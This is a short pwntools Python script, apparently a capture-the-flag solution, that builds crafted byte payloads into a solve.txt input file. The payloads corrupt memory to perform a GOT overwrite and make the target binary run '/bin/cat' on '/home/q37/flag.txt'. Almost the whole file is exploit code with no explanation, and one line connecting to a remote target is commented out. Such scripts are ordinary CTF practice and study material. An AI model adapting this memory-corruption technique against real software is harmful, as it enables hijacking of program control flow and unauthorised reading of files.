from pwn import *
import os

path = os.getcwd() + '/solve.txt'

# p = remote('localhost')

# def func(size, s, t):
#     p.sendline(str(size))
#     p.send(s)
#     p.send(' ')
#     p.sendline(t)

def func(size, s, t):
    with open(path, mode='ab') as f:
       f.write(str(size).encode()+b' ')
       f.write(s+b' ')
       f.write(t+b'\n') 

with open(path, mode='w') as f:
    f.write(str(2)+'\n')

t = b'\x00' * 0x10
# t += b'\x00' * 0x210        # ??
t += (b'\x00' * 0x4 + b'\x00\xc0\xc0\xa0') * 0x10
t += b'\x00' * 0x190
t += b'\x00\xff' * 0x8

func(0x18, b'', t)

s = b'/bin/cat\x00/home/q37/flag.txt'

t = b'\x00' * len('/home/q37/flag.txt')
t += b'\xe0'    
t += b'\x00' * len('/bin/cat')
t += p64(0) * 8      
t += p32(0)
t += b'\x00\x05\x84\x40'        # GOT Overwrite

func(0x318, s, t)
